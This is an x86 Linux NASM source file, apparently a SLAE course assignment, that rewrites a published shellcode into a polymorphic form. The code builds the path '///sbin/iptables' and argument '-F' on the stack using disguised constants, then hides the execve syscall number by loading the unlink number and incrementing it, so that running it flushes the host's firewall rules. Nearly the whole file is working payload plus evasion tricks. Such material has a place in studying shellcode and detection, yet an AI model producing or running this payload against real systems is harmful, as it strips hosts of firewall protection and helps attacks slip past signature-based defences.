; Filename: SLAEpolyIPTablesFlush.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
; Student ID:  PA-7462
; Purpose: SLAE Assignmnet 6.1 - Polymorphed version of iptables flush shellcode, Original found here: http://shell-storm.org/shellcode/files/shellcode-825.php 

global _start			

section .text
_start:

  	xor eax,eax
   	push eax
   	push word 0x462d
   	mov esi,esp
   	push eax
	mov dword [esp-4], 0x73656c61  	; Moving (instead of pushing)  string value minus one to obfuscate it
	inc dword [esp-4]		; Increment value to get correct string
	mov dword [esp-8], 0x61747058	; Moving (instead of pushing) string value minus 0x11 to ofuscate it
	add byte [esp-8], 0x11		; Add 0x11 to value to get correct string
	sub esp, 8			; Manually adjust the stack pointer since we moved the values instead of pushing
   	push 0x2f6e6962			
   	push 0x732f2f2f		
   	mov ebx,esp
   	push eax
   	push esi
   	push ebx
	mov ecx,esp
	mov edx,eax
	mov al,0xa			; Setting AL to 0xa (sys_unlink) to obfuscate sys_execve use
	inc al				; Increment AL by 1 to 0xb (sys_execve)
	int 0x80
